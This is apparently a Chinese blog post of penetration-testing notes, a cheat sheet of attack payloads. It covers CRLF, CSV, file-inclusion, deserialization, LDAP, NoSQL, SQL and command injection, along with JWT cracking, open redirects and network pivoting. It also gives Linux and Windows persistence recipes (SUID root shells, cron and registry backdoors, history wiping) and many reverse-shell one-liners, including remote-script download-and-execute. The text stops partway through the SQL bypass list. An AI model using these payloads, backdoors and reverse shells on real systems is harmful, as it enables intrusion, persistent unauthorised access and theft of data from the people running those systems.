      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试笔记]]></title>
    <url>%2F2018%2F12%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[最近看到一个很不错的仓库，趁有时间，全部看了下做个笔记。 1、CRLFCRLF - 添加cookie1http://www.example.com/%0D%0ASet-Cookie:mycookie=myvalue CRLF - 绕过XSS1http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2f%2e%2e CRLF - 钓鱼1http://www.example.com/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E CRLF - Filter Bypass1234567使用UTF-8编码：%E5%98%8A =&gt; %0A =&gt; \u560a%E5%98%8D =&gt; %0D =&gt; \u560d%E5%98%BE =&gt; %3E =&gt; \u563e (&gt;)%E5%98%BC =&gt; %3C =&gt; \u563c (&lt;)%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE 2、CSV Excel表达式注入123456任何以'='，'+'，'-'，'@'字符开头的单元格都将被表格软件解释为公式动态数据交换（Dynamic Data Exchange）：=DDE(server; file; item; mode)Exploit：=DDE ("cmd";"/C calc";"!A0")A0@SUM(1+1)*cmd|' /C calc'!A0 3、文件包含Linux1234567891011121314151617/etc/issue/etc/passwd/etc/shadow/etc/group/etc/hosts/etc/motd/etc/mysql/my.cnf/proc/PID/fd/文件描述符/proc/self/environ/proc/version/proc/cmdline/proc/sched_debug/proc/mounts/proc/net/arp/proc/net/route/proc/net/tcp/proc/net/udp Windows1234567891011121314151617181920c:/boot.inic:/inetpub/logs/logfilesc:/inetpub/wwwroot/global.asac:/inetpub/wwwroot/index.aspc:/inetpub/wwwroot/web.configc:/sysprep.infc:/sysprep.xmlc:/sysprep/sysprep.infc:/sysprep/sysprep.xmlc:/system32/inetsrv/metabase.xmlc:/sysprep.infc:/sysprep.xmlc:/sysprep/sysprep.infc:/sysprep/sysprep.xmlc:/system volume information/wpsettings.datc:/system32/inetsrv/metabase.xmlc:/unattend.txtc:/unattend.xmlc:/unattended.txtc:/unattended.xml log12345678/var/log/apache/access.log/var/log/apache/error.log/var/log/httpd/error_log/usr/local/apache/log/error_log/usr/local/apache2/log/error_log/var/log/vsftpd.log/var/log/sshd.log/var/log/mail 基本语法1http://example.com/index.php?page=../../../etc/passwd 00截断1http://example.com/index.php?page=../../../etc/passwd%00 双编码12http://example.com/index.php?page=%252e%252e%252fetc%252fpasswdhttp://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00 目录穿越12345678http://example.com/index.php?page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[...]\.\.http://example.com/index.php?page=../../../../[…]../../../../../etc/passwdBypass Filter:http://example.com/index.php?page=....//....//etc/passwdhttp://example.com/index.php?page=..///////..////..//////etc/passwdhttp://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd 协议封装php://filter123456http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.phphttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.phphttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.phphttp://example.com/index.php?page=php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=index.php链接大文件：http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd zip://12345echo "&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;" &gt; payload.php; zip payload.zip payload.php;mv payload.zip shell.jpg;http://example.com/index.php?page=zip://shell.jpg%23payload.php data://123456http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=base64内容: "&lt;?php system($_GET['cmd']);?&gt;"绕过xss防护http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+base64内容: &lt;svg onload=alert(1)&gt; expect://12http://example.com/index.php?page=expect://idhttp://example.com/index.php?page=expect://ls input://123http://example.com/index.php?page=php://inputPOST:&lt;?php system('id'); ?&gt; phar://123456789101112131415161718192021// 创建一个Phar文件$phar = new Phar('test.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('test.txt', 'text');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');// 添加元数据class AnyClass &#123;&#125;$object = new AnyClass;$object-&gt;data = 'phar';$phar-&gt;setMetadata($object);$phar-&gt;stopBuffering();// 漏洞触发class AnyClass &#123; function __destruct() &#123; echo $this-&gt;data; &#125;&#125;// 输出: pharinclude('phar://test.phar'); 远程命令执行/proc/*/fd12341、上传一些shell文件（100+）2、包含: http://example.com/index.php?page=/proc/$PID/fd/$FD$PID 进程号（可爆破）$FD 文件描述符（可爆破） /proc/self/environ1234和日志文件一样，在ua中发送的payload，会记录在/proc/self/environ文件中GET index.php?page=../../../proc/self/environ HTTP/1.1User-Agent: &lt;?=phpinfo(); ?&gt; 文件上传123上传一个包含恶意代码的任意格式的文件，比如: &lt;?php system($_GET['c']);?&gt;http://example.com/index.php?page=path/to/upload/file.png 条件竞争12345678910111213141516171819202122231、上传一个文件并触发自包含2、大量重复上传来增加赢得竞争的几率和爆破的几率3、对包含文件进行爆破: /tmp/[0-9a-zA-Z]&#123;6&#125;// bruteforce_upload_race.pyimport itertoolsimport requestsimport sysprint('[+] Upload Trying...')f = &#123;'file': open('shell.php', 'rb')&#125;for _ in range(4096 * 4096): requests.post('http://target.com/index.php?c=index.php', f)print('[+] Bruteforcing...')for fname in itertools.combinations(string.ascii_letters + string.digits, 6): url = 'http://target.com/index.php?c=/tmp/php' + fname r = requests.get(url) if 'load average' in r.text: # &lt;?php echo system('uptime'); print('[+] We have got a shell: ' + url) sys.exit(0)print('[x] Something went wrong, please try again') phpinfohttps://www.insomniasec.com/downloads/publications/phpinfolfi.py 4、不安全的反序列化Java12345678910111213Exploit：https://github.com/frohoff/ysoserialjava -jar ysoserial.jar CommonsCollections1 calc.exe &gt; commonpayload.binjava -jar ysoserial.jar Groovy1 calc.exe &gt; groovypayload.binjava -jar ysoserial-master-v0.0.4-g35bce8f-67.jar Groovy1 'ping 127.0.0.1' &gt; payload.binjava -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64Burp Suite扩展：JavaSerialKillerJava Deserialization ScannerBurp-ysoserialSuperSerialSuperSerial-Active PHP12345678910111213&lt;?php system('gnome-terminal -x sh -c \'nc -lvvp 2333\'');class PHPObjectInjection&#123; public $inject = "system('wget http://127.0.0.1/backdoor.txt -O phpobjbackdoor.php &amp;&amp; php phpobjbackdoor.php');";&#125;$url = 'http://localhost/xvwa/vulnerabilities/php_object_injection/?r=';$url = $url . urlencode(serialize(new PHPObjectInjection));print "[+] Sending exploit...\r\n";$response = file_get_contents("$url");?&gt; Python12345678910import cPicklefrom base64 import b64encode, b64decodeclass Evil(object): def __reduce__(self): return (os.system,("whoami",))e = Evil()evil_token = b64encode(cPickle.dumps(e))print("Your Evil Token : &#123;&#125;").format(evil_token) Ruby12345678for i in &#123; 0..5&#125;;do docker run - it ruby: 2. $ &#123; i&#125;ruby - e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil';done 5、JWT（JSON Web Token）12345678910111213141516171819格式: Base64(Header).Base64(Data).Base64(Signature)Example: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOYJWT在线加解密：https://www.jsonwebtoken.io/JWT利用工具:jwt_toolgit clone https://github.com/ticarpi/jwt_tool&gt; python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw result.txtc-jwt-crackergit clone https://github.com/brendan-rius/c-jwt-cracker&gt;./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE&gt; Secret is "Sn1f"Hashcathashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?aeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret 6、LDAP注入12345678910111213141516171819202122232425262728293031323334353637383940414243Example 1:user = *)(uid=*))(|(uid=*pass = passwordquery = "(&amp;(uid=*)(uid=*)) (|(uid=*)(userPassword=MD5(password&#125;))"Example 2:user = admin)(!(&amp;(1=0pass = q))query = (&amp;(uid=admin)(!(&amp;(1=0)(userPassword=q))))攻击Payload:**)(&amp;*))%00)(cn=))\x00*()|%26'*()|&amp;'*(|(mail=*))*(|(objectclass=*))*)(uid=*))(|(uid=**/**|/////*@*|admin*admin*)((|userpassword=*)admin*)((|userPassword=*)x' or name()='username' or 'x'='y默认属性:// *)(ATTRIBUTE_HERE=*userPasswordsurnamenamecnsnobjectClassmailgivenNamecommonName 7、Linux-持久控制基本反弹shell123ncat --udp -lvp 2333ncat --tcp -lvp 2333ncat --sctp -lvp 2333 SUID12345TMPDIR="/var/tmp"echo 'int main(void)&#123;setresuid(0, 0, 0);system("/bin/sh");&#125;' &gt; $TMPDIR/suidshell.cgcc $TMPDIR/suidshell.c -o $TMPDIR/suidshell 2&gt;/dev/nullchown root:root $TMPDIR/suidshellchmod 4777 $TMPDIR/suidshell Crontab1(crontab -l ; echo "@reboot sleep 200 &amp;&amp; ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2&gt; /dev/null 启动服务12RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2&gt;/dev/null"sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart 启动文件1234567891011Linux, write a file in ~/.config/autostart/NOM_OF_FILE.desktopIn : ~/.config/autostart/*.desktop[Desktop Entry]Type=ApplicationName=WelcomeExec=/var/lib/gnome-welcome-tourAutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guideOnlyShowIn=GNOME;X-GNOME-Autostart-enabled=false 驱动程序1echo "ACTION==\"add\",ENV&#123;DEVTYPE&#125;==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules &gt; /dev/null Tips123456789101112131415161718191、使用ANSI字符隐藏payload2、清除历史命令export HISTSIZE=0export HISTFILESIZE=0unset HISTFILE; CTRL-Dorkill -9 $$orecho "" &gt; ~/.bash_historyorrm ~/.bash_history -rforhistory -corln /dev/null ~/.bash_history -sf3、以下临时目录通常是可写的/var/tmp//tmp//dev/shm/ 8、Windows-持久控制注册表123456789在HKCU\Software\Microsoft\Windows的Run中创建REG_SZ名称: Backdoor值: C:\Users\test\AppData\Local\Temp\backdoor.exe与HKCU一样，在HKLM\Software\Microsoft\Windows的Run键中创建REG_SZ名称: Backdoor值: C:\Windows\Temp\backdoor.exe 启动项123在用户启动文件夹中创建批处理脚本PS C:\&gt; gc C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.batstart /b C:\Users\test\AppData\Local\Temp\backdoor.exe 计划任务123456PS C:\&gt; $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Windows\Temp\backdoor.exe"PS C:\&gt; $T = New-ScheduledTaskTrigger -Daily -At 9amPS C:\&gt; $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel HighestPS C:\&gt; $S = New-ScheduledTaskSettingsSetPS C:\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $SPS C:\&gt; Register-ScheduledTask Backdoor -InputObject $D 服务1PS C:\&gt; New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." 9、网络转发Windows netsh12345678netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destportnetsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.1101、listenaddress – 等待连接的本地IP地址2、listenport – 本地等待连接的监听端口3、connectaddress – 将连接重定向到的远程IP地址4、connectport – 将listenport连接转发到此端口 SSHSOCKS代理123ssh -N -f -D 9000 [user]@[host]-f : ssh in background-N : do not execute a remote command 本地端口转发1ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host] 远程端口转发1ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host] Proxychains1234561、Config file: /etc/proxychains.conf [ProxyList] socks4 localhost 80802、proxychains nmap -sT 192.168.5.6 Web SOCKS - reGeorg123https://github.com/sensepost/reGeorgpython reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp Metasploit12345portfwd listportfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445orrun autoroute -s 192.168.57.0/24use auxiliary/server/socks4a 10、反弹shellBash TCP123bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;10&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 Bash UDP1234肉鸡:sh -i &gt;&amp; /dev/udp/127.0.0.1/4242 0&gt;&amp;1攻击机:nc -u -lvp 4242 Perl1234567perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'NOTE: Windows onlyperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;' PythonLinux123python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' Windows1python -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), &#123;'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type('try', (), &#123;'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])(&#123;&#125;), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])(&#123;&#125;), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))" PHP1php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' Ruby123456ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'NOTE: Windows onlyruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end' nc12ncat 127.0.0.1 4444 -e /bin/bashncat --udp 127.0.0.1 4444 -e /bin/bash Powershell1231、powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IPADDR]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()2、powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()"3、powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1') Awk1awk 'BEGIN &#123;s = "/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;"; while(42) &#123; do&#123; printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != "exit") close(s); &#125;&#125;' /dev/null Java123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() NodeJS123456require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')or-var x = global.process.mainModule.require-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')orhttps://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py 11、NoSQL注入Exploit123456789101112131415161718192021222324使用$ne、$gt绕过认证in URLusername[$ne]=toto&amp;password[$ne]=totoin JSON&#123;"username": &#123;"$ne": null&#125;, "password": &#123;"$ne": null&#125; &#125;&#123;"username": &#123;"$ne": "foo"&#125;, "password": &#123;"$ne": "bar"&#125; &#125;&#123;"username": &#123;"$gt": undefined&#125;, "password": &#123;"$gt": undefined&#125; &#125;获取长度username[$ne]=toto&amp;password[$regex]=.&#123;1&#125;username[$ne]=toto&amp;password[$regex]=.&#123;3&#125;获取数据in URLusername[$ne]=toto&amp;password[$regex]=m.&#123;2&#125;username[$ne]=toto&amp;password[$regex]=md.&#123;1&#125;username[$ne]=toto&amp;password[$regex]=mdporusername[$ne]=toto&amp;password[$regex]=m.*username[$ne]=toto&amp;password[$regex]=md.*in JSON&#123;"username": &#123;"$eq": "admin"&#125;, "password": &#123;"$regex": "^m" &#125;&#125;&#123;"username": &#123;"$eq": "admin"&#125;, "password": &#123;"$regex": "^md" &#125;&#125;&#123;"username": &#123;"$eq": "admin"&#125;, "password": &#123;"$regex": "^mdp" &#125;&#125; NoSQL盲注1234567891011121314151617import requestsimport urllib3import stringimport urlliburllib3.disable_warnings()username="admin"password=""while True: for c in string.printable: if c not in ['*','+','.','?','|']: payload='&#123;"username": &#123;"$eq": "%s"&#125;, "password": &#123;"$regex": "^%s" &#125;&#125;' % (username, password + c) r = requests.post(u, data = &#123;'ids': payload&#125;, verify = False) if 'OK' in r.text: print("Found one more char : %s" % (password+c)) password += c MongoDB Payloads1234567891011121314151617true, $where: '1 == 1', $where: '1 == 1'$where: '1 == 1'', $where: '1 == 1'1, $where: '1 == 1'&#123; $ne: 1 &#125;', $or: [ &#123;&#125;, &#123; 'a':'a' &#125; ], $comment:'successful MongoDB injection'db.injection.insert(&#123;success:1&#125;);db.injection.insert(&#123;success:1&#125;);return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1|| 1==1' &amp;&amp; this.password.match(/.*/)//+%00' &amp;&amp; this.passwordzz.match(/.*/)//+%00'%20%26%26%20this.password.match(/.*/)//+%00'%20%26%26%20this.passwordzz.match(/.*/)//+%00&#123;$gt: ''&#125;[$ne]=1 12、开放重定向Exploit123456789101112131415161718192021222324252627281、使用白名单绕过www.whitelisted.com.evil.com2、使用'CRLF'绕过'javascript'黑名单关键字java%0d%0ascript%0d%0a:alert(0)3、使用'//'绕过'http'黑名单关键字//baidu.com4、使用'https'绕过'//'黑名单关键字https:baidu.com5、使用'\/\/'绕过'//'黑名单关键字\/\/baidu.com//\/baidu.com/6、使用'%E3%80%82'绕过'.'黑名单关键字//baidu%E3%80%82com7、使用'%00'绕过黑名单//baidu%00.com8、使用参数污染绕过?next=whitelisted.com&amp;next=baidu.com9、使用'@'绕过http://whitelisted.com@baidu.com/10、使用目录绕过http://www.baidu.com/http://www.whitelisted.com/http://www.baidu.com/folder/www.whitelisted.com11、XSS by Open URL（如果在js变量中）";alert(0);//12、XSS by data协议http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==13、XSS by javascript协议http://www.example.com/redirect.php?url=javascript:prompt(1) 通用参数12345678910111213141516171819202122232425/&#123;payload&#125;?next=&#123;payload&#125;?url=&#123;payload&#125;?target=&#123;payload&#125;?rurl=&#123;payload&#125;?dest=&#123;payload&#125;?destination=&#123;payload&#125;?redir=&#123;payload&#125;?redirect_uri=&#123;payload&#125;?redirect_url=&#123;payload&#125;?redirect=&#123;payload&#125;/redirect/&#123;payload&#125;/cgi-bin/redirect.cgi?&#123;payload&#125;/out/&#123;payload&#125;/out?&#123;payload&#125;?view=&#123;payload&#125;/login?to=&#123;payload&#125;?image_url=&#123;payload&#125;?go=&#123;payload&#125;?return=&#123;payload&#125;?returnTo=&#123;payload&#125;?return_to=&#123;payload&#125;?checkout_url=&#123;payload&#125;?continue=&#123;payload&#125;?return_path=&#123;payload&#125; 13、远程命令执行连接符12345ps;lsps&amp;lsps&amp;&amp;lsps|lsfail_command||ls 内嵌命令12other_command `cat /etc/passwd`other_command $(cat /etc/passwd) 绕过空格-Linux1234567cat&lt;/etc/passwd&#123;cat,/etc/passwd&#125;cat$IFS/etc/passwdecho$&#123;IFS&#125;"RCE"$&#123;IFS&#125;&amp;&amp;cat$&#123;IFS&#125;/etc/passwdX=$'uname\x20-a'&amp;&amp;$Xsh&lt;/dev/tcp/127.0.0.1/80IFS=,;`cat&lt;&lt;&lt;uname,-a` 绕过空格-Windows12ping%CommonProgramFiles:~10,-18%IPping%PROGRAMFILES:~10,-5%IP 通配符1234567891011常用通配符*?[][-][^][!]&#123;str1,str2,…&#125;专用字符集.../???/??t /???/p??s?? 绕过zsh/bash/sh123echo $0-&gt; /usr/bin/zshecho whoami|$0 其他绕过12345678910111213单引号w'h'o'am'i双引号w"h"o"am"i反斜杠和斜杠w\ho\am\i/\b\i\n/////s\h使用$@who$@ami扩展变量test=/ehhh/hmtc/pahhh/hmsswdcat $&#123;test//hhh\/hm/&#125;cat $&#123;test//hh??hm/&#125; 14、SQL注入 MSSQL 注入 MySQL 注入 OracleSQL 注入 PostgreSQL 注入 SQLite 注入 检测点123456789101112131415161718'%27"%22#%23;%3B)Wildcard (*)%%2727%25%27`+HERP'||'DERP'+'herp' 'DERP'%20'HERP'%2B'HERP DBMS识别12345678910111213141516171819202122232425["conv('a',16,2)=conv('a',16,2)" ,"MYSQL"]["connection_id()=connection_id()" ,"MYSQL"]["crc32('MySQL')=crc32('MySQL')" ,"MYSQL"]["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)" ,"MSSQL"]["@@CONNECTIONS&gt;0" ,"MSSQL"]["@@CONNECTIONS=@@CONNECTIONS" ,"MSSQL"]["@@CPU_BUSY=@@CPU_BUSY" ,"MSSQL"]["USER_ID(1)=USER_ID(1)" ,"MSSQL"]["ROWNUM=ROWNUM" ,"ORACLE"]["RAWTOHEX('AB')=RAWTOHEX('AB')" ,"ORACLE"]["LNNVL(0=123)" ,"ORACLE"]["5::int=5" ,"POSTGRESQL"]["5::integer=5" ,"POSTGRESQL"]["pg_client_encoding()=pg_client_encoding()" ,"POSTGRESQL"]["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"]["quote_literal(42.5)=quote_literal(42.5)" ,"POSTGRESQL"]["current_database()=current_database()" ,"POSTGRESQL"]["sqlite_version()=sqlite_version()" ,"SQLITE"]["last_insert_rowid()&gt;1" ,"SQLITE"]["last_insert_rowid()=last_insert_rowid()" ,"SQLITE"]["val(cvar(1))=1" ,"MSACCESS"]["IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0" ,"MSACCESS"]["cdbl(1)=cdbl(1)" ,"MSACCESS"]["1337=1337", "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"]["'i'='i'", "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"] SQLmap自动化攻击1sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 认证绕过123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990'-'' ''&amp;''^''*'' or 1=1 limit 1 -- -+'="or'' or ''-'' or '' '' or ''&amp;'' or ''^'' or ''*''-||0'"-||0""-"" ""&amp;""^""*"" or ""-"" or "" "" or ""&amp;"" or ""^"" or ""*"or true--" or true--' or true--") or true--') or true--' or 'x'='x') or ('x')=('x')) or (('x'))=(('x" or "x"="x") or ("x")=("x")) or (("x"))=(("xor 2 like 2or 1=1or 1=1--or 1=1#or 1=1/*admin' --admin' #admin'/*admin' or '2' LIKE '1admin' or 2 LIKE 2--admin' or 2 LIKE 2#admin') or 2 LIKE 2#admin') or 2 LIKE 2--admin') or ('2' LIKE '2admin') or ('2' LIKE '2'#admin') or ('2' LIKE '2'/*admin' or '1'='1admin' or '1'='1'--admin' or '1'='1'#admin' or '1'='1'/*admin'or 1=1 or ''='admin' or 1=1admin' or 1=1--admin' or 1=1#admin' or 1=1/*admin') or ('1'='1admin') or ('1'='1'--admin') or ('1'='1'#admin') or ('1'='1'/*admin') or '1'='1admin') or '1'='1'--admin') or '1'='1'#admin') or '1'='1'/*1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055admin" --admin" #admin"/*admin" or "1"="1admin" or "1"="1"--admin" or "1"="1"#admin" or 